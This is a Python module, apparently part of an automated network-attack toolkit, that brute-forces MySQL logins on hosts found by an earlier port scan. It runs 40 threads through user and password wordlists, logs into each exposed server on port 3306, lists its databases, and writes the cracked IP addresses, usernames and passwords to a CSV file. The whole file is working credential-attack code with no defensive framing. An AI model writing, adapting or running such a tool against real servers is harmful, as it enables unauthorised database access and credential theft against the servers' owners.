import os
import pandas as pd
import pymysql
import threading
import logging
import time
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
from queue import Queue
from shared import SharedData
from logger import Logger

# Configure the logger
logger = Logger(name="sql_bruteforce.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "SQLBruteforce"
b_module = "sql_connector"
b_status = "brute_force_sql"
b_port = 3306
b_parent = None


class SQLBruteforce:
    """
    Class to handle the SQL brute force process.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.sql_connector = SQLConnector(shared_data)
        logger.info("SQLConnector initialized.")
    
    def bruteforce_sql(self, ip, port):
        """
        Run the SQL brute force attack on the given IP and port.
        """
        return self.sql_connector.run_bruteforce(ip, port)
    
    def execute(self, ip, port, row, status_key):
        """
        Execute the brute force attack and update status.
        """
        success, results = self.bruteforce_sql(ip, port)
        return 'success' if success else 'failed'

class SQLConnector:
    """
    Class to manage the connection attempts and store the results.
    """
    def __init__(self, shared_data):
        self.shared_data = shared_data
        self.load_scan_file()
        self.users = open(shared_data.usersfile, "r").read().splitlines()
        self.passwords = open(shared_data.passwordsfile, "r").read().splitlines()

        self.lock = threading.Lock()
        self.sqlfile = shared_data.sqlfile
        if not os.path.exists(self.sqlfile):
            with open(self.sqlfile, "w") as f:
                f.write("IP Address,User,Password,Port,Database\n")
        self.results = []
        self.queue = Queue()
        self.console = Console()

    def load_scan_file(self):
        """
        Load the scan file and filter it for SQL ports.
        """
        self.scan = pd.read_csv(self.shared_data.netkbfile)
        if "Ports" not in self.scan.columns:
            self.scan["Ports"] = None
        self.scan = self.scan[self.scan["Ports"].str.contains("3306", na=False)]

    def sql_connect(self, adresse_ip, user, password):
        """
        Attempt to connect to an SQL service using the given credentials without specifying a database.
        """
        try:
            # Première tentative sans spécifier de base de données
            conn = pymysql.connect(
                host=adresse_ip,
                user=user,
                password=password,
                port=3306
            )
            
            # Si la connexion réussit, récupérer la liste des bases de données
            with conn.cursor() as cursor:
                cursor.execute("SHOW DATABASES")
                databases = [db[0] for db in cursor.fetchall()]
                
            conn.close()
            logger.info(f"Successfully connected to {adresse_ip} with user {user}")
            logger.info(f"Available databases: {', '.join(databases)}")
            
            # Sauvegarder les informations avec la liste des bases trouvées
            return True, databases
            
        except pymysql.Error as e:
            logger.error(f"Failed to connect to {adresse_ip} with user {user}: {e}")
            return False, []


    def worker(self, progress, task_id, success_flag):
        """
        Worker thread to process items in the queue.
        """
        while not self.queue.empty():
            if self.shared_data.orchestrator_should_exit:
                logger.info("Orchestrator exit signal received, stopping worker thread.")
                break

            adresse_ip, user, password, port = self.queue.get()
            success, databases = self.sql_connect(adresse_ip, user, password)
            
            if success:
                with self.lock:
                    # Ajouter une entrée pour chaque base de données trouvée
                    for db in databases:
                        self.results.append([adresse_ip, user, password, port, db])
                    
                    logger.success(f"Found credentials for IP: {adresse_ip} | User: {user} | Password: {password}")
                    logger.success(f"Databases found: {', '.join(databases)}")
                    self.save_results()
                    self.remove_duplicates()
                    success_flag[0] = True
                    
            self.queue.task_done()
            progress.update(task_id, advance=1)

    def run_bruteforce(self, adresse_ip, port):
        self.load_scan_file()

        total_tasks = len(self.users) * len(self.passwords)
        
        for user in self.users:
            for password in self.passwords:
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
                    return False, []
                self.queue.put((adresse_ip, user, password, port))

        success_flag = [False]
        threads = []

        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%")) as progress:
            task_id = progress.add_task("[cyan]Bruteforcing SQL...", total=total_tasks)

            for _ in range(40):  # Adjust the number of threads based on the RPi Zero's capabilities
                t = threading.Thread(target=self.worker, args=(progress, task_id, success_flag))
                t.start()
                threads.append(t)

            while not self.queue.empty():
                if self.shared_data.orchestrator_should_exit:
                    logger.info("Orchestrator exit signal received, stopping bruteforce.")
                    while not self.queue.empty():
                        self.queue.get()
                        self.queue.task_done()
                    break

            self.queue.join()

            for t in threads:
                t.join()

        logger.info(f"Bruteforcing complete with success status: {success_flag[0]}")
        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful

    def save_results(self):
        """
        Save the results of successful connection attempts to a CSV file.
        """
        df = pd.DataFrame(self.results, columns=['IP Address', 'User', 'Password', 'Port', 'Database'])
        df.to_csv(self.sqlfile, index=False, mode='a', header=not os.path.exists(self.sqlfile))
        logger.info(f"Saved results to {self.sqlfile}")
        self.results = []

    def remove_duplicates(self):
        """
        Remove duplicate entries from the results CSV file.
        """
        df = pd.read_csv(self.sqlfile)
        df.drop_duplicates(inplace=True)
        df.to_csv(self.sqlfile, index=False)

if __name__ == "__main__":
    shared_data = SharedData()
    try:
        sql_bruteforce = SQLBruteforce(shared_data)
        logger.info("[bold green]Starting SQL brute force attack on port 3306[/bold green]")
        
        # Load the IPs to scan from shared data
        ips_to_scan = shared_data.read_data()
        
        # Execute brute force attack on each IP
        for row in ips_to_scan:
            ip = row["IPs"]
            sql_bruteforce.execute(ip, b_port, row, b_status)
        
        logger.info(f"Total successful attempts: {len(sql_bruteforce.sql_connector.results)}")
        exit(len(sql_bruteforce.sql_connector.results))
    except Exception as e:
        logger.error(f"Error: {e}")
